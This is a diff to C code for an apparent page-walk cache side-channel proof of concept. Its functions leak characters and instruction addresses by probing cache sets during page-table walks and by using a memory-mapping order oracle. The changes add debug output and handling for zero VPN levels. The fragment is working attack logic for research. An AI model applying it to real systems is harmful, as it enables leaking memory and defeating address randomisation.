@@ -37,10 +37,12 @@ struct pwsc_ans leak_ascii_char(uint64_t addr, uint64_t *init_noise_filter,
 
   // Determine VPN4 cache set (this leaks the initial 6 bits of the ascii
   // character)
+  fprintf(stdout, "Trying to leak the address %lx\n", addr);
   struct pwsc_ans init_pwsc_ans;
   init_pwsc_ans.va.va = 0;
   init_pwsc_ans.num_lines_found = 0;
   uint64_t initial_line = leak_pwsc_non_cached(addr, init_noise_filter);
+  fprintf(stdout, "The inital line is %lu\n", initial_line);
   if (initial_line != ncache_lines) {
     init_pwsc_ans.va.vpn4_set = initial_line;
     init_pwsc_ans.num_lines_found = 1;
@@ -69,6 +71,7 @@ struct pwsc_ans leak_ascii_char(uint64_t addr, uint64_t *init_noise_filter,
       return init_pwsc_ans;
     }
     *va_buffer = 0x5A;
+    fprintf(stdout, "We are verifying the guess %lx\n", guess.va.va);
 
     // Check if our guess is correct
     // ****Please note! that if the vpn4 set and vpn3 set are equal this will
@@ -103,26 +106,41 @@ struct pwsc_ans leak_inst_addr(uint64_t addr, uint64_t *init_noise_filter,
   // give up lol. It doesn't seem to have that big of a hit on performance and
   // helps improve speed.
 
-  // Don't attempt to use the mapping order oracle on kernel pointers
+  // Don't attempt to use the mapping order oracle on kernel pointers - Can we
+  // mmap kernel pages from userspace? Probably not
   if (init_profile.va.vpn4_set > 31 && init_profile.num_lines_found == 1)
     return init_profile;
 
   // If we found multiple cache sets (lines) then we either don't know the
   // cache offsets. Then we should return all zeros to not claim to know
   // anything
-  if (init_profile.num_lines_found != 1) {
+  if (init_profile.num_lines_found > 1) {
+    fprintf(stdout, "Too noisy! Please try again\n");
     init_profile.va.va = 0;
     return init_profile;
   }
 
   // Memory mapping order oracle
   struct pwsc_ans ret = init_profile;
-  // At this point we have 18 believed to be VPN4
   uint64_t previous_set = ret.va.vpn4_set;
+
+  // If we don't see any lines in our initial search then it is likely that the
+  // address is a low address with higher VPN values all being 0. So, we assume
+  // VPN4 to be 0 and go from there.
+
+  if (previous_set == 0) {
+    fprintf(stderr, "[WARNING] Unable to determine CO and VPN4 cache set, "
+                    "assuming to be 0\n");
+    ret.va.vpn4_set = 0;
+    ret.va.vpn4_co = 0;
+    ret.num_lines_found = 1;
+    previous_set = 64;
+  }
+
   for (int cur_depth = ret.num_lines_found; cur_depth <= 4; cur_depth++) {
     for (uint8_t co_guess = 0; co_guess < 8; co_guess++) {
 
-      // Fill in guess
+      // Fill in guess for the level we are working with
       if (cur_depth == 1)
         ret.va.vpn4_co = co_guess;
       else if (cur_depth == 2)
@@ -132,7 +150,7 @@ struct pwsc_ans leak_inst_addr(uint64_t addr, uint64_t *init_noise_filter,
       else if (cur_depth == 4)
         ret.va.vpn1_co = co_guess;
 
-      // Avoid making the memory mapped region result in the nexet vpn set to
+      // Avoid making the memory mapped region result in the next vpn set to
       // be 0 which we have trouble handling
       if (cur_depth <= 1) {
         ret.va.vpn3_set = 32;
@@ -163,8 +181,13 @@ struct pwsc_ans leak_inst_addr(uint64_t addr, uint64_t *init_noise_filter,
       // Check if guess is right
       uint64_t found_line = leak_pwsc_non_cached(addr, init_noise_filter);
       fprintf(stdout, "Found line is %lu\n", found_line);
+      fprintf(stdout, "Previous set is %lu\n", previous_set);
+
       munmap((void *)va_buffer, 4096);
-      if (found_line != ncache_lines && found_line != previous_set) {
+
+      // If found line is not ncache_lines and different from previous_set mark
+      // it as the set for next level
+      if (found_line != previous_set) {
         if (cur_depth == 1)
           ret.va.vpn3_set = found_line;
         else if (cur_depth == 2)
@@ -179,26 +202,25 @@ struct pwsc_ans leak_inst_addr(uint64_t addr, uint64_t *init_noise_filter,
         previous_set = found_line;
         break;
       } else if (found_line == ncache_lines) {
-        // It may the base that the next vpn set is blocked by the noise
-        // filter somehow thus no signal tells us that our guess is correct
-        // but we can't continue since we don't exactly know the next vpn set.
-        goto return_ans;
+        // If the found line was not as previous_set, then the address we are
+        // looking for has not been mapped yet or it is 0. If it has not been
+        // mapped yet, we will find a line which is not ncache_line later, if it
+        // is ncache_line, even after 8 iterations we will not see a line that
+        // is not ncache_line, and we can assume it to be 0
+        previous_set = found_line;
       }
     }
 
-    // Found nothing
+    // We searched all 8 guesses and found nothing
     if (ret.num_lines_found == (uint64_t)cur_depth) {
       fprintf(stderr, "[WARNING] Unable to determine CO and next cache set, "
                       "assuming to be 0\n");
-      // goto return_ans;
-      if (cur_depth == 1) { // We found nothing, so 18 does not map to VPN 4,
-                            // set it to 0 and continue
+      if (cur_depth == 1) {
         ret.va.vpn4_set = 0;
         ret.va.vpn4_co = 0;
         ret.va.vpn3_set = previous_set;
       }
-      if (cur_depth == 2) { // We found nothing, so 18 does not map to VPN 3,
-                            // set it to 0 and continue
+      if (cur_depth == 2) {
         ret.va.vpn3_set = 0;
         ret.va.vpn3_co = 0;
         ret.va.vpn2_set = previous_set;
